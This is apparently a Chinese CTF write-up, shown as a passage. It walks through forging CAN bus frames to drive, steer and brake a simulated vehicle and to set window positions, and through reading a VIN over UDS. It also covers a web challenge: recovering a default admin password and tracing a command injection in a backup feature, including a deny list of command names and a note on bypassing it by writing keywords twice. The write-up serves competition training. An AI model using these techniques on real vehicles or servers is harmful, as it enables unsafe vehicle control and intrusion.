<span class="token number">0.000000</span>  <span class="token number">404</span>  00 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>报文ID为404</p>
<p>flag：<code>dk_flag&#123;401_402_403_404&#125;</code></p>
<hr>
<h2 id="自动驾驶域"><a href="#自动驾驶域" class="headerlink" title="自动驾驶域"></a>自动驾驶域</h2><h3 id="自动驾驶逻辑破解"><a href="#自动驾驶逻辑破解" class="headerlink" title="自动驾驶逻辑破解"></a>自动驾驶逻辑破解</h3><p>逆向出来的核心逻辑：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 挂1档</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v5 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 踩油门到40度</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 挂2档</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 踩油门到50度</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 401#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 左转30度</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 402#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 松开油门</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">int_to_hex</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span>v9<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 踩刹车到70度</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">receive_can_message</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> <span class="token number">789</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 404#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 挂N档	</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"cansend can3 403#00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 松开刹车</span>
<span class="token function">send_can_message</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">close</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>自动驾驶逻辑：先挂1档起步，踩油门到40度，车速 27km&#x2F;h 左右；然后挂2档，车速 35km&#x2F;h 左右，踩油门到50度，车速 14km&#x2F;h 左右；接下来方向盘左转30度，车速 9km&#x2F;h 左右，松开油门；踩刹车到70度，挂N档，然后松开刹车，停车</p>
<hr>
<h2 id="车身域"><a href="#车身域" class="headerlink" title="车身域"></a>车身域</h2><h3 id="车窗报文获取"><a href="#车窗报文获取" class="headerlink" title="车窗报文获取"></a>车窗报文获取</h3><blockquote>
<p>操作虚拟车辆，尝试获取车窗状态报文ID（例如车窗的状态报文ID为0x123，则提交123），提交到平台（格式:dk_flag{十六进制消息ID}）。</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">83</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">64</span> <span class="token number">64</span> 00 00 00 00 .ddd<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">87</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">3.572785</span>   <span class="token number">91</span>  00 <span class="token number">64</span> <span class="token number">46</span> <span class="token number">64</span> 00 00 00 00 .dFd<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  2F4  04 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">9.999999</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

06 delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">2.231212</span>   <span class="token number">91</span>  00 <span class="token number">64</span> 1E <span class="token number">64</span> 00 00 00 00 .d.d<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token number">0.000000</span>  2F6  0A 00 00 00 00 00 00 00 <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>

<span class="token number">80</span> delta   ID  data <span class="token punctuation">..</span>.                  <span class="token operator">&lt;</span> cansniffer can0 <span class="token comment"># l=20 h=100 t=500 ></span>
<span class="token number">0.000000</span>   <span class="token number">91</span>  00 00 00 <span class="token number">64</span> 00 00 00 00 <span class="token punctuation">..</span>.d<span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag：<code>dk_flag&#123;091&#125;</code></p>
<h3 id="车窗控制"><a href="#车窗控制" class="headerlink" title="车窗控制"></a>车窗控制</h3><blockquote>
<p>操作虚拟车辆，获取车窗状态报文，逆向分析报文协议，通过逆向结果尝试构造左前车窗升起30%，左后升起50%，右前车窗升起70%，右后车窗升起30%的报文，通过CAN ID 0x11发送该构造好的报文到仿真车辆，可通过虚拟车辆仪表页面验证构造结果。假如构造的报文是cansend can0  011#01010101，则提交01010101，提到平台（格式:dk_flag{报文}）</p>
</blockquote>
<p>四个十六进制位依次代表：左前 右前 左后 右后</p>
<p>开启是0x00，关闭是0x64</p>
<p>那么升起30%是0x1E，升起50%是0x32，升起70%是0x46</p>
<p>flag：<code>dk_flag&#123;1E46321E&#125;</code></p>
<hr>
<h2 id="OBD2"><a href="#OBD2" class="headerlink" title="OBD2"></a>OBD2</h2><h3 id="车辆VIN读取"><a href="#车辆VIN读取" class="headerlink" title="车辆VIN读取"></a>车辆VIN读取</h3><blockquote>
<p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试篡改改这辆车的VIN码，他想先获取下当前车辆的VIN码。通过查询手册，他构造了730#0322F190这样一个报文来读取车辆的VIN，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的VIN字符串，提交到平台（格式:dk_flag{VIN字符串}）。</p>
</blockquote>
<p>发送报文，另一边抓包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">730</span><span class="token comment">#0322F190</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110094112861.png" alt="image-20250110094112861"></p>
<p><code>candump can1</code>下来看具体的十六进制包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">can1  <span class="token number">730</span>   <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>  03 <span class="token number">22</span> F1 <span class="token number">90</span>
can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">10</span> <span class="token number">14</span> <span class="token number">62</span> F1 <span class="token number">90</span> <span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>
can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">21</span> 5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span>
can1  <span class="token number">738</span>   <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>  <span class="token number">22</span> <span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.iodraw.com/blog/221207386">https://www.iodraw.com/blog/221207386</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40242571/article/details/120756736">https://blog.csdn.net/qq_40242571/article/details/120756736</a></p>
<p>VIN码一般是17位的，取出其中的有效响应数据：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">57</span> <span class="token number">59</span> <span class="token number">55</span>
5A <span class="token number">41</span> <span class="token number">31</span> <span class="token number">53</span> <span class="token number">32</span> <span class="token number">46</span> <span class="token number">45</span>
<span class="token number">44</span> 4B <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">30</span> <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>解码即可得到VIN码</p>
<p>flag：<code>dk_flag&#123;WYUZA1S2FEDK00001&#125;</code></p>
<h3 id="车辆故障数量读取"><a href="#车辆故障数量读取" class="headerlink" title="车辆故障数量读取"></a>车辆故障数量读取</h3><blockquote>
<p>小张是一名车联网安全专家，负责评估一款新型智能网联汽车的安全性。这款汽车支持UDS（统一诊断服务）协议，允许通过标准化的诊断命令读取或者写入车辆信息和执行维护操作。为了确保系统的安全性，小张决定决定依照UDS标准尝试读取当前车辆故障数量。通过查询手册，他构造了710#03190103这样一个报文来读取车辆的故障数量，现在要求你在can1口上发送这样报文，也参照UDS标准的定义，对响应结果进行解析，从中提取出车辆的故障数量，提交到平台（格式:dk_flag{故障数量}）。</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cansend can1 <span class="token number">710</span><span class="token comment">#03190103</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110095040842.png" alt="image-20250110095040842"></p>
<p>猜测是718上的某位数字</p>
<p>flag：<code>dk_flag&#123;2&#125;</code></p>
<hr>
<h1 id="信创安全挑战区"><a href="#信创安全挑战区" class="headerlink" title="信创安全挑战区"></a>信创安全挑战区</h1><h2 id="misc-入侵流量监测"><a href="#misc-入侵流量监测" class="headerlink" title="misc-入侵流量监测"></a>misc-入侵流量监测</h2><p>date，爆破8位日期即可</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109100514281.png" alt="image-20250109100514281"></p>
<hr>
<h2 id="web-国产办公软件漏洞利用"><a href="#web-国产办公软件漏洞利用" class="headerlink" title="web-国产办公软件漏洞利用"></a>web-国产办公软件漏洞利用</h2><p>data\backup\2025-01-03_MD4zU</p>
<p>后台admin账密</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_cache_user_detail<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'&#123;\"uid\":\"1\",\"username\":\"admin\",\"isadministrator\":\"1\",\"deptid\":\"0\",\"positionid\":\"0\",\"roleid\":\"0\",\"upuid\":\"0\",\"groupid\":\"0\",\"jobnumber\":\"\",\"realname\":\"\\u8d85\\u7ea7\\u7ba1\\u7406\\u5458\",\"password\":\"bc3bc521c972d39d1e5748598987c77f\",\"gender\":\"1\",\"weixin\":\"\",\"mobile\":\"11111111111\",\"email\":\"\",\"status\":\"0\",\"createtime\":\"1735912196\",\"credits\":\"0\",\"newcomer\":\"1\",\"salt\":\"a8AZi8\",\"validationemail\":\"0\",\"validationmobile\":\"0\",\"lastchangepass\":\"0\",\"guid\":\"5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD\",\"birthday\":\"0\",\"telephone\":\"\",\"address\":\"\",\"qq\":\"\",\"bio\":\"\",\"remindsetting\":\"\",\"avatar_big\":\"data\\/avatar\\/noavatar_big.jpg\",\"avatar_middle\":\"data\\/avatar\\/noavatar_middle.jpg\",\"avatar_small\":\"data\\/avatar\\/noavatar_small.jpg\",\"bg_big\":\"data\\/home\\/nobg_big.jpg\",\"bg_middle\":\"\",\"bg_small\":\"data\\/home\\/nobg_small.jpg\",\"group_title\":\"\",\"level\":1,\"upgrade_percent\":0,\"next_group_credit\":0,\"alldeptid\":\"0\",\"deptname\":\"\",\"posname\":\"\",\"allposid\":\"\",\"rolename\":\"\",\"allroleid\":\"\",\"space_url\":\"?r=user\\/home\\/index&amp;uid=1\"&#125;'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>密码md5解不出来</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>1234_user<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'超级管理员'</span><span class="token punctuation">,</span><span class="token string">'bc3bc521c972d39d1e5748598987c77f'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'11111111111'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1735912196</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a8AZi8'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'5BAACB4F-3651-E9B1-BADC-5CD9A7AAD9BD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>搜一下找到加密逻辑，是两次<code>md5(md5($pass),$salt)</code></p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113138639.png" alt="image-20250109113138639"></p>
<p>测出来密码是123456</p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113251988.png" alt="image-20250109113251988"></p>
<p>原来是默认密码</p>
<p>然后就进后台了，接下来参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9115">https://xz.aliyun.com/t/9115</a></p>
<p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250109113955181.png" alt="image-20250109113955181"></p>
<p>抓包</p>
<p>漏洞点在：system\core\utils\Database.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$dumpFile</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token constant">PATH_ROOT</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$backupFileName</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.sql'</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dumpFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqlBin</span> <span class="token operator">=</span> <span class="token variable">$mysqlBase</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">:</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$mysqlBase</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'bin/'</span><span class="token punctuation">;</span>
<span class="token variable">$command1</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--skip-opt --create-options'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'-all'</span><span class="token punctuation">;</span>
<span class="token variable">$command2</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extendins'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--extended-insert'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$command3</span> <span class="token operator">=</span> <span class="token variable">$dbVersion</span> <span class="token operator">></span> <span class="token string single-quoted-string">'4.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$sqlCompat</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'MYSQL40'</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'--compatible=mysql40'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$command4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">"--port=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"--socket=\"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span>
<span class="token variable">$command5</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$command4</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token comment">//这。。。是黑科技</span>
<span class="token string backtick-quoted-string">`&#123;$mysqlBin&#125;mysqldump --force --quick &#123;$command1&#125; --add-drop-table &#123;$command2&#125; &#123;$command3&#125; --host="&#123;$db['host']&#125;" &#123;$command5&#125; --user="&#123;$db['username']&#125;" --password="&#123;$db['password']&#125;" "&#123;$db['dbname']&#125;" &#123;$tablesstr&#125; > &#123;$dumpFile&#125;`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>向上跟踪</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// --- 备份文件夹及备份文件名 ---</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name static-context">File</span><span class="token operator">::</span><span class="token function">makeDir</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$backupFileName</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BACKUP_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'head'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'less'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>filename这样ban，替换函数的话双写绕过即可</p>
<p>再往上看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 检查导出名字</span>
<span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token class-name static-context">Env</span><span class="token operator">::</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$hasDangerFileName</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\.)(exe|jsp|asp|aspx|cgi|fcgi|pl)(\.|$)/i'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
